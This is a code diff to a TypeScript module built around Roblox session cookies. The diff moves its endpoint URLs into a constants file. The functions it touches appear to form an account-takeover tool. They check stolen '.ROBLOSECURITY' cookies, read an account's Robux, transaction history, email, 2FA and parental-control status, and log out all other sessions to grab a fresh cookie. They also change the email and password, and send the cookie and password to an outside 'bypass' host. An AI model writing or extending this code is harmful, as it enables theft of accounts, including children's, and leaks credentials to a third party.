@@ -1,6 +1,7 @@
 import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
+import { ENDPOINTS } from './endpoints';
 
 const AXIOS_TIMEOUT = 25000;
 const MAX_RETRIES = 3;
@@ -69,7 +70,7 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
       await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
       const client = wrapper(axios.create({ jar }));
 
-      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
+      const resp = await client.get(ENDPOINTS.USERS_AUTHENTICATED, {
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
         validateStatus: () => true,
         timeout: AXIOS_TIMEOUT,
@@ -131,7 +132,7 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     };
 
-    const csrfResp = await client.post('https://auth.roblox.com/v2/logout', {}, {
+    const csrfResp = await client.post(ENDPOINTS.AUTH_LOGOUT, {}, {
       headers: baseHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -142,7 +143,7 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
     }
 
     const refreshHeaders = { ...baseHeaders, 'X-CSRF-TOKEN': csrf };
-    const refreshResp = await client.post('https://auth.roblox.com/v2/session/refresh', {}, {
+    const refreshResp = await client.post(ENDPOINTS.AUTH_SESSION_REFRESH, {}, {
       headers: refreshHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -169,7 +170,7 @@ export async function refreshSession(cookie: string): Promise<{ success: boolean
 
 export async function getUserAge(userId: number): Promise<number> {
   try {
-    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: AXIOS_TIMEOUT });
+    const resp = await axios.get(ENDPOINTS.USERS_USER(String(userId)), { timeout: AXIOS_TIMEOUT });
     const created = new Date(resp.data.created);
     const now = new Date();
     const diff = now.getTime() - created.getTime();
@@ -181,7 +182,7 @@ export async function getUserAge(userId: number): Promise<number> {
 
 export async function fetchRobux(cookie: string, userId: string): Promise<number> {
   try {
-    const resp = await axiosWithRetry<any>('get', `https://economy.roblox.com/v1/users/${userId}/currency`, {
+    const resp = await axiosWithRetry<any>('get', ENDPOINTS.ECONOMY_CURRENCY(userId), {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
@@ -191,7 +192,7 @@ export async function fetchRobux(cookie: string, userId: string): Promise<number
 
 export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
   try {
-    const resp = await fetch(`https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`, {
+    const resp = await fetch(ENDPOINTS.TRANSACTION_TOTALS(userId), {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
@@ -205,7 +206,7 @@ export async function fetchTransactionTotals(cookie: string, userId: string): Pr
 export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
   for (let i = 0; i <= retries; i++) {
     try {
-      const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
+      const resp = await fetch(ENDPOINTS.ACCOUNT_COUNTRY, {
         headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
       });
       if (resp.status === 200) {
@@ -221,7 +222,7 @@ export async function fetchCountry(cookie: string, retries = 2): Promise<string>
 export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
   for (let i = 0; i <= retries; i++) {
     try {
-      const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
+      const resp = await fetch(ENDPOINTS.ACCOUNT_EMAIL, {
         headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
       });
       if (resp.status === 200) {
@@ -236,7 +237,7 @@ export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ ver
 
 export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
   try {
-    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
+    const resp = await fetch(ENDPOINTS.PARENTAL_CONTROLS, {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
@@ -249,10 +250,9 @@ export async function fetchParentalControls(cookie: string): Promise<{ hasParent
 
 export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
   try {
-    const resp = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
-      { headers: { 'User-Agent': 'Mozilla/5.0' } }
-    );
+    const resp = await fetch(ENDPOINTS.AVATAR_THUMBNAIL(userId), {
+      headers: { 'User-Agent': 'Mozilla/5.0' },
+    });
     if (resp.status === 200) {
       const data = (await resp.json()) as { data: { imageUrl: string }[] };
       if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
@@ -276,17 +276,16 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
       'Referer': 'https://www.roblox.com/',
     };
 
-    const url = 'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate';
     let newCookie: string | null = null;
     let authResp;
 
     for (let attempt = 0; attempt < 3; attempt++) {
-      authResp = await client.post(url, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
+      authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
       if (authResp.status === 403) {
         const csrf = authResp.headers['x-csrf-token'];
         if (csrf) {
           headers['X-CSRF-TOKEN'] = csrf;
-          authResp = await client.post(url, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
+          authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
         }
       }
       if (authResp.status === 200) {
@@ -316,7 +315,7 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
 
 export async function checkTwoFactorStatus(cookie: string, userId: string): Promise<{ enabled: boolean; mediaType: string | null }> {
   try {
-    const resp = await fetch(`https://www.roblox.com/v1/users/${userId}/configuration`, {
+    const resp = await fetch(ENDPOINTS.USER_CONFIGURATION(userId), {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
@@ -344,10 +343,7 @@ export async function addPendingEmail(cookie: string, newEmail: string, password
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     };
 
-    const url = 'https://accountsettings.roblox.com/v1/email';
-    const payload = { email: newEmail, password };
-
-    let resp = await session.post(url, payload, {
+    let resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
       headers: baseHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -355,7 +351,7 @@ export async function addPendingEmail(cookie: string, newEmail: string, password
 
     if (resp.status === 403 && resp.headers['x-csrf-token']) {
       const csrf = resp.headers['x-csrf-token'];
-      resp = await session.post(url, payload, {
+      resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
         headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
         validateStatus: () => true,
         timeout: AXIOS_TIMEOUT,
@@ -394,10 +390,7 @@ export async function changePassword(
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     };
 
-    const url = 'https://auth.roblox.com/v1/user/passwords/change';
-    const payload = { currentPassword, newPassword };
-
-    let resp = await session.post(url, payload, {
+    let resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
       headers: baseHeaders,
       validateStatus: () => true,
       timeout: AXIOS_TIMEOUT,
@@ -405,7 +398,7 @@ export async function changePassword(
 
     if (resp.status === 403 && resp.headers['x-csrf-token']) {
       const csrf = resp.headers['x-csrf-token'];
-      resp = await session.post(url, payload, {
+      resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
         headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
         validateStatus: () => true,
         timeout: AXIOS_TIMEOUT,
@@ -435,7 +428,7 @@ export async function bypassAgeVerification(cookie: string, password: string): P
 }> {
   try {
     const resp = await axios.post(
-      'https://rbx-bypass.com/api/public/bypass',
+      ENDPOINTS.BYPASS_API,
       { cookie, password },
       {
         headers: {
